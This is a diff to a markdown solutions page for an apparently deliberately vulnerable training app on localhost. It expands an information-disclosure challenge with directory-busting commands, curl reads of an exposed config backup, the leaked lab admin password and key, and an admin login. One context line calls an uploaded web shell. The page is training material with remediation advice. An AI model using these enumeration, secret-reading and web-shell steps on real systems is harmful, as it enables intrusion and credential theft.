@@ -2,7 +2,7 @@
 tags: [css-exam, labs, solution, web]
 ---
 # VulnCorp (app 1) — Solutions
-> ↑ [[Lab Kit — hands-on training environment|Lab Kit]] · method: [[Web Penetration Test Checklist]]
+> ↑ Lab Kit · method: Web Penetration Test Checklist
 
 Try each vuln yourself first (checklist Phase 0 → detect → exploit). `U=http://localhost:8000`.
 
@@ -85,16 +85,55 @@ curl -s "$U/uploads/sh.php?c=id"
 **Command:** `curl -sD - "$U/" -o /dev/null | grep -i content-security-policy`
 **Result:** `...script-src 'self' 'unsafe-inline'...`. **Reason:** `'unsafe-inline'` defeats the main purpose of CSP — compare with challenges 5/6 where it was absent.
 
-## 9. Information disclosure
-**Answer:** a config backup, robots, a security.txt pointer, and an HTML comment leak secrets/paths.
+## 9. Information disclosure — exposed config backup leaks admin creds
+
+**Answer:** a backup of the app config (`config.php.bak`) is left in the web root. Because `.bak` is
+not executed by PHP it is served as plaintext source, leaking `ADMIN_PASS = S3ntinel!Admin` and
+`API_SIGNING_KEY = sk_live_9f2c1a77d4b0e5f6a1b2c3d4`. `robots.txt` advertised the path.
+Flag: `FLAG{c0nfig_backup_left_in_webroot}`.
+
+**Discovery (how the path was found):** the app returns a page for almost every path, so plain
+status-based busting is noisy and `robots.txt`/`uploads` get hidden (they 404). `feroxbuster` with
+all status codes + link extraction surfaces them:
+```
+feroxbuster -u http://localhost:8000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+# -> 200 config.php.bak ; 404 .well-known /private /uploads /pages   (the real paths)
+```
+(ffuf/gobuster work too once you filter the wildcard: `ffuf ... -ac` or `gobuster ... --exclude-length 3545,5577`.)
+
 **Command:**
 ```
-curl -s "$U/config.php.bak"                     # ADMIN_PASS + API_SIGNING_KEY
-curl -s "$U/robots.txt"; curl -s "$U/.well-known/security.txt"
-curl -s "$U/private/deployment-notes.txt"       # pointed to by security.txt
-curl -s "$U/" | grep -i '<!--'                  # dev TODO comment
+curl -s "$U/robots.txt"                          # map of "hidden" paths
+curl -s "$U/config.php.bak"                       # served as PLAINTEXT -> ADMIN_PASS + API_SIGNING_KEY
+curl -s "$U/.well-known/security.txt"             # points to the deployment notes
+curl -s "$U/private/deployment-notes.txt"         # confirms creds are live
+curl -s "$U/" | grep -i '<!--'                    # dev TODO comment
 ```
-**Result:** admin creds, signing key, internal deployment notes. **Reason:** backup/`.well-known`/comments left in the web root.
+
+**Result:**
+```
+# robots.txt -> Disallow: /private/  /config.php.bak  /.well-known/
+# config.php.bak ->
+$ADMIN_USER      = 'admin';
+$ADMIN_PASS      = 'S3ntinel!Admin';
+$API_SIGNING_KEY = 'sk_live_9f2c1a77d4b0e5f6a1b2c3d4';
+// FLAG{c0nfig_backup_left_in_webroot}
+# deployment-notes.txt -> "credential rotation: pending (still S3ntinel!Admin)"
+```
+Then `admin : S3ntinel!Admin` logs in at `/login.php` → full admin.
+
+**Reason:** `config.php` is executed by PHP (source never returned); the `.bak` copy has no PHP
+handler so the server returns it verbatim. `robots.txt` is **not** access control — it only
+enumerated the sensitive paths.
+
+> Gotcha: opening `config.php.bak` in a **browser looks blank** — the browser hides `<?php … ?>` as an
+> unknown processing-instruction tag. Use **View Source (Ctrl+U)** or `curl` to read it.
+
+**Impact:** unauthenticated disclosure of the admin password + an API signing key → full compromise
+and the ability to forge signed API requests.
+
+**Remediation:** keep configs **outside** the web root; remove `*.bak`/`*.old`/`*~`/`*.swp`/`.git/`
+from it; protect sensitive paths with auth (not `robots.txt`); rotate the exposed password and key.
 
 ## 10. Weak / default credentials  (`login.php`)
 **Answer:** several accounts use guessable passwords.
